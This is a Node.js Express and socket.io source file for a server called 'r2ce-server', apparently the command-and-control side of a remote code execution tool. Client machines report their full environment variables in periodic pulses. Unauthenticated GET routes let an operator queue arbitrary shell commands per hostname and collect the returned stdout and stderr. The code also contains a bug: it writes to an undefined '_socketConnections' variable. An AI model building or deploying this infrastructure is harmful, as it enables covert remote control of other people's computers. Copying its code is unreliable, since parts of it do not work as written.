const { v4: uuidv4 } = require('uuid');
const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http);
const port = 6022;

const _activePulseList = {};
const _pendingCommands = {};

const _socketsByHosts = {};
const _hostsBySocketId = {};

const expirePulseList = () => {
    var expireKeys = Object.keys(_activePulseList).filter(p => _activePulseList[p].expires < Date.now());
    expireKeys.forEach(k => {
        delete _activePulseList[k];
    });
};

app.use(express.json());

app.use((req, res, next) => {
    console.log(`@(${new Date().toISOString()}) | [${req.ip}] ${req.method} ${req.url}`);
    next();
});

app.get('/', (req, res) => {
    res.send('r2ce-server');
});

app.get('/cmd/pending', (req, res) => {
    res.send(_pendingCommands);
});

app.get('/cmd/:hostname/:command', (req, res) => {
    if (_activePulseList[req.params.hostname]) {
        _pendingCommands[req.params.hostname] = { command: req.params.command, id: uuidv4() };
        res.sendStatus(201);
    }
    else {
        res.sendStatus(406);
    }
});



app.get('/socket/:hostname/:command', (req, res) => {
    if (_socketsByHosts[req.params.hostname]) {
        _socketsByHosts[req.params.hostname].emit('command', req.params.command);
    }
    res.sendStatus(204);
});

app.get('/pulse/active', (req, res) => {
    res.send(_activePulseList);
});

app.post('/pulse', (req, res) => {
    console.log(`>> incoming pulse from ${req.body.COMPUTERNAME} @ ${req.body.HOMEPATH}`);

    _activePulseList[req.body.COMPUTERNAME] = {
        env: req.body,
        expires: Date.now() + 60 * 1000
    };

    const pendingCommand = _pendingCommands[req.body.COMPUTERNAME];
    if (pendingCommand) {
        delete _pendingCommands[req.body.COMPUTERNAME];
        res.status(201).header('cid', pendingCommand.id).send(pendingCommand.command);
    }
    else {
        res.sendStatus(204);
    }
});

app.post('/pulse/callback/:hostname', (req, res) => {
    console.log(`>> callback [${req.body.cid}] ${req.params.hostname} ${req.body.command}`);
    console.log(`\t ${req.body.stdout}`);
    console.log(`\t ${req.body.stderr}`);
    console.log(`\t ${req.body.error}`);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    console.log('new connection');

    socket.on('setActive', (hostname) => {
        _socketConnections[hostname] = socket;
        _hostsBySocketId[socket.id] = hostname;
    });

    socket.on('result', (data) => {
        const hostname = _hostsBySocketId[socket.id];
        console.log(`::${hostname}:: ${data}`);
    });

    socket.on('disconnect', () => {
        const hostname = _hostsBySocketId[socket.id];
        const id = socket.id;
        delete _socketsByHosts[hostname];
        delete _hostsBySocketId[socket.id];
        console.log(`disconnected :${socket.id}`);
    });
});

http.listen(port, () => {
    setInterval(expirePulseList, 20);
    console.log(`r2ce-server @ http://localhost:${port}`)
});